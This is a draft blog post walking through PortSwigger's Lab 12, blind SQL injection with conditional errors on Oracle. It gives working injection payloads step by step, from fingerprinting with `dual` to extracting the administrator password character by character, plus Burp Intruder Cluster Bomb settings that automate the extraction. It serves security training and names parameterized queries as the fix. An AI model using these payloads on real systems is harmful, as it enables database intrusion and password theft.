Title: Blind SQL Injection with Conditional Errors (and Oracle's `dual` Table)
Date: 2023-05-22 21:00
Category: Security
Tags: security, sql injection, sqli, blind sqli, oracle, burp suite, portswigger
Status: draft

Part 5 of our
[PortSwigger Web Security Academy series](working-through-the-portswigger-web-security-academy.html).
This is the meaty one. We already covered
[blind SQLi with conditional responses](blind-sql-injection-with-conditional-responses.html),
where the page renders differently depending on the truth of an injected
boolean. This post covers what to do when the page *doesn't* render
differently - but you can still smuggle information out by deliberately
causing SQL errors.

The example is PortSwigger's Lab 12, which is Oracle-flavored. Full notes:
[SQL Injection/Blind](https://charlesreid1.com/wiki/SQL_Injection/Blind).

## The Six Steps

The full attack has six steps:

1. Prove the parameter is injectable
2. Fingerprint the database
3. Confirm a `users` table exists
4. Confirm the `administrator` user exists
5. Find the password length
6. Extract the password one character at a time

Every step builds on the previous one. This is the shape of most serious
SQLi attacks - you don't get from "the parameter looks funny" to "here is
the admin password" in a single request.

## Step 1: Prove Injectability

Start with an injection that would be a valid SQL fragment if pasted into
a query, using SQL string concatenation:

```
' || (select '') || '
```

This is well-formatted SQL. It should not error. But the server returns
a 500.

Why? Because on Oracle, `SELECT` statements *require* a `FROM` clause.
Oracle has a built-in single-row single-column table called `dual` that
exists specifically for `SELECT`s that don't have a real table to draw
from. Try:

```
' || (select '' from dual) || '
```

That returns 200. Well-formatted. Now confirm it wasn't a fluke:

```
' || (select '' from dualoiweuroqiurepoiquwer) || '
```

That returns 500, because there is no such table. Two data points - one
using a real Oracle table, one using a garbage table - confirms both that
the parameter is injectable and that the database is Oracle.

That is the *fingerprint*. Every major database has one or two quirks
like this that betray it. Oracle's is `dual` + the `FROM`-required rule.

## Step 2: Confirm the `users` Table Exists

Now that we know the database is Oracle, we can start reconnaissance:

```
' || (select '' from users) || '
```

If `users` exists, this should return 200 - but it may return 500 anyway,
because the subquery might return multiple rows and the outer query
expected a scalar. Add a row limiter:

```
' || (select '' from users where rownum = 1) || '
```

200. The `users` table exists. `rownum` is another Oracle-ism - it's the
one-indexed row number of the current result, and `rownum = 1` gives you
exactly one row.

## Step 3: Confirm the `administrator` User Exists

Here is where things get interesting. Try:

```
' || (select '' from users where username='administrator') || '
```

The problem: this returns 200 whether or not the administrator user
exists. If there is no matching row, the subquery returns nothing (empty
string), and the concatenation is still valid. We need a way to make the
query error *only* when our condition is true.

The trick is `CASE WHEN ... THEN TO_CHAR(1/0) ELSE '' END`. Divide by
zero throws a runtime error, but only when the `WHEN` branch executes.
Wrap it in a boolean:

```
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
```

This returns 500, because `1=1` is true and we hit the divide-by-zero.

```
' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
```

This returns 200, because `1=0` is false and we take the `ELSE` branch.

Now we have an oracle where **500 means true** and **200 means false**.
Combine it with the users-table check:

```
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '
```

The `FROM` clause is executed first. If the user exists, the `CASE`
executes and we get 500. If the user doesn't exist, the `SELECT` returns
no rows and no error fires - 200.

500 confirms the administrator user exists.

## Step 4: Find the Password Length

Same primitive, different condition:

```
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>1) || '
```

500 if password length is greater than 1. 200 if not.

Fire this at every integer from 1 to 50. The largest N that returns 500
is the password length minus one (because when `LENGTH(password) > N` is
false, we get 200).

For efficiency, use Burp Intruder:

* Send to Intruder
* Positions → Clear all positions, then mark the `1` as the payload
* Payloads → Numbers, sequential, 1 to 50, step 1
* Run

At N = 20, response switches from 500 to 200. Password length is 20.

## Step 5: Extract the Password Character by Character

Same idea, one more condition wrapper:

```
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and SUBSTR(password,1,1)='a') || '
```

500 if the first character of the password is `a`, 200 otherwise.

Fire at all 36 alphanumeric characters. One returns 500. That's character
1.

Then character 2:

```
' || ... and SUBSTR(password,2,1)='a') || '
```

Then character 3. And so on. 20 characters, 36 letters each - 720
requests total.

## Step 6: Automate With Cluster Bomb

Doing 720 requests one at a time is not fun. Burp Intruder's Cluster Bomb
attack type is built for exactly this:

* Send to Intruder
* Positions → Mark the substring position (the `1` in `SUBSTR(password,1,1)`)
  as payload 1
* Positions → Mark the guessed character (the `a`) as payload 2
* Attack type → Cluster bomb (runs every combination of payload 1 × payload 2)
* Payload 1 → Numbers 1 to 20, step 1
* Payload 2 → Brute forcer, alphabet `abcdefghijklmnopqrstuvwxyz0123456789`, min 1, max 1
* Filter results by response code 500

You get exactly 20 hits, one per position. Read them off in order.
Password extracted.

## Why This Attack Is Worth Understanding

Every one of these tricks is small on its own. `dual`. `rownum`.
`CASE WHEN ... TO_CHAR(1/0)`. `SUBSTR`. Combined, they let you exfiltrate
an entire password from a database that isn't showing you anything.

The 500-vs-200 oracle is the key move, and it generalizes. Anywhere the
server does something you can observe based on a boolean you injected,
you can build an oracle. Conditional errors are one instance. Time-based
attacks (deliberately calling `pg_sleep()` or `WAITFOR DELAY`) are
another. The plumbing changes, the shape is the same.

## The Fix

Parameterized queries. Same as every other post in this series. There is
no clever mitigation for SQL injection that isn't "stop building queries
with string concatenation."

## References

* Our wiki: [SQL Injection/Blind](https://charlesreid1.com/wiki/SQL_Injection/Blind)
* [Lab 12 - Blind SQLi with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
* [Burp Suite Intruder documentation](https://portswigger.net/burp/documentation/desktop/tools/intruder)
